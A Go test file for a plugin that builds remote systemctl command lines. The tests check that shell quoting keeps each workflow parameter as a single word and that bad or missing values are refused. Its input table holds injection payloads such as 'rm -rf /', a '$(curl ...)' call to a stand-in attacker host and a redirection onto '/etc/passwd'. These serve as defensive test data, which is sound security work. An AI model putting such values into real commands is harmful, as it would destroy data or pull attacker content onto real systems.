package main

import (
	"strings"
	"testing"
	"time"

	"github.com/picatz/flowstate/pkg/flowstate/v1/plugin/sdk"
)

// parameterisedCommand is a grant whose pattern is deliberately permissive, so
// the tests below measure the quoting rather than the pattern. A real grant
// constrains both; the point here is that quoting alone holds when a pattern
// does not.
func parameterisedCommand(pattern string) commandGrant {
	command := commandGrant{
		Argv:       []string{"/usr/bin/systemctl", "restart", "${service}"},
		Parameters: map[string]parameterGrant{"service": {Pattern: pattern, MaxBytes: 128}},
		Timeout:    Duration(10 * time.Second),
	}
	if err := command.check("restart"); err != nil {
		panic(err)
	}
	return command
}

// TestAParameterBecomesExactlyOneArgument is the property the whole quoting
// exists for: whatever a value holds, the remote shell reads it as one word.
func TestAParameterBecomesExactlyOneArgument(t *testing.T) {
	// (?s) so that even a value holding a newline reaches the quoting: an
	// ordinary pattern refuses one already, which the test below records, and
	// what is measured here is what quoting does when a pattern does not.
	command := parameterisedCommand(`(?s).*`)

	for name, value := range map[string]string{
		"a shell separator":   "nginx.service; rm -rf /",
		"a substitution":      "$(curl http://attacker.example.com)",
		"a backtick":          "`id`",
		"a redirection":       "> /etc/passwd",
		"an embedded quote":   `it's-a-service`,
		"a newline":           "nginx\nrm -rf /",
		"an ampersand":        "a && b",
		"a glob":              "*",
		"a leading hyphen":    "--force",
		"a quoted assignment": `x='y'`,
	} {
		line, err := buildCommandLine(command, map[string]string{"service": value})
		if err != nil {
			t.Errorf("%s: %v", name, err)
			continue
		}

		// The command line is three single-quoted words and nothing else: the
		// program, its argument, and the parameter. Splitting it the way a
		// shell would is the assertion.
		words := splitQuoted(t, line)
		if len(words) != 3 {
			t.Errorf("%s: %q split into %d words, want 3", name, line, len(words))
			continue
		}
		if words[0] != "/usr/bin/systemctl" || words[1] != "restart" {
			t.Errorf("%s: the operator's own argv changed: %q", name, line)
		}
		if words[2] != value {
			t.Errorf("%s: the parameter arrived as %q, want %q", name, words[2], value)
		}
	}
}

// splitQuoted parses the subset of shell syntax this plugin emits: words of
// single-quoted runs, where '\” is a literal quote. It is deliberately its own
// small parser rather than a shell, because running a shell to check that no
// shell will be confused proves the wrong thing.
func splitQuoted(t *testing.T, line string) []string {
	t.Helper()

	var words []string
	var current strings.Builder
	inQuotes := false

	for i := 0; i < len(line); i++ {
		switch {
		case line[i] == '\'':
			inQuotes = !inQuotes
		case !inQuotes && line[i] == '\\' && i+1 < len(line) && line[i+1] == '\'':
			// The escaped quote between two quoted runs.
			current.WriteByte('\'')
			i++
		case !inQuotes && line[i] == ' ':
			words = append(words, current.String())
			current.Reset()
		default:
			current.WriteByte(line[i])
		}
	}
	if inQuotes {
		t.Fatalf("the command line %q has an unterminated quote", line)
	}
	words = append(words, current.String())
	return words
}

// TestAnOrdinaryPatternRefusesANewlineBecauseItIsAnchored records a property
// worth knowing when writing a grant: patterns are anchored to the whole value,
// and Go's `.` does not match a newline - so an operator who writes `.*` has
// already excluded a value carrying a second line, without having thought about
// it.
func TestAnOrdinaryPatternRefusesANewlineBecauseItIsAnchored(t *testing.T) {
	command := parameterisedCommand(`.*`)

	if _, err := buildCommandLine(command, map[string]string{"service": "nginx\nrm -rf /"}); err == nil {
		t.Error("a value carrying a newline passed a `.*` pattern")
	}
}

// TestAValueThatFailsThePatternIsRefusedAndNotEchoed: the pattern is the first
// of the two defences, and a value that failed it is exactly the kind of value
// not to write into durable history.
func TestAValueThatFailsThePatternIsRefusedAndNotEchoed(t *testing.T) {
	command := parameterisedCommand(`[a-z0-9-]{1,64}\.service`)

	_, err := buildCommandLine(command, map[string]string{"service": "nginx.service; rm -rf /"})
	if err == nil {
		t.Fatal("a value the operator's pattern refuses was used")
	}
	if !sdk.IsInvalidInput(err) {
		t.Errorf("error is %v, want invalid input", err)
	}
	if strings.Contains(err.Error(), "rm -rf") {
		t.Errorf("the refusal echoes the value that failed the pattern: %v", err)
	}
}

// TestAnUndeclaredParameterIsRefused keeps a call from carrying values a grant
// never declared - which would otherwise be silently ignored, leaving an author
// believing they had changed the command.
func TestAnUndeclaredParameterIsRefused(t *testing.T) {
	command := parameterisedCommand(`.*`)

	_, err := buildCommandLine(command, map[string]string{"service": "nginx.service", "user": "root"})
	if err == nil {
		t.Fatal("a parameter the command does not declare was accepted")
	}
	if !strings.Contains(err.Error(), "service") {
		t.Errorf("the refusal does not name what the command does take: %v", err)
	}
}

// TestAMissingParameterIsRefusedRatherThanEmpty: rendering an unsupplied
// placeholder as "" is how `systemctl restart ”` happens.
func TestAMissingParameterIsRefusedRatherThanEmpty(t *testing.T) {
	command := parameterisedCommand(`.*`)

	if _, err := buildCommandLine(command, nil); err == nil {
		t.Fatal("a command with an unfilled placeholder was built")
	}
}

// TestAValueOverTheParametersLimitIsRefused bounds what a workflow can put in a
// command line.
func TestAValueOverTheParametersLimitIsRefused(t *testing.T) {
	command := parameterisedCommand(`.*`)

	if _, err := buildCommandLine(command, map[string]string{"service": strings.Repeat("x", 200)}); err == nil {
		t.Fatal("a value over the parameter's max_bytes was used")
	}
}

// TestTheOperatorsOwnArgvIsQuotedToo: quoting only what a workflow filled would
// make the guarantee depend on remembering which half a string came from, and
// an operator's argument holding a space would silently become two.
func TestTheOperatorsOwnArgvIsQuotedToo(t *testing.T) {
	command := commandGrant{Argv: []string{"/usr/bin/env", "MESSAGE=hello world"}, Timeout: Duration(time.Second)}
	if err := command.check("env"); err != nil {
		t.Fatalf("check: %v", err)
	}

	line, err := buildCommandLine(command, nil)
	if err != nil {
		t.Fatalf("buildCommandLine: %v", err)
	}
	if words := splitQuoted(t, line); len(words) != 2 || words[1] != "MESSAGE=hello world" {
		t.Errorf("the command line %q does not carry the operator's argument as one word", line)
	}
}
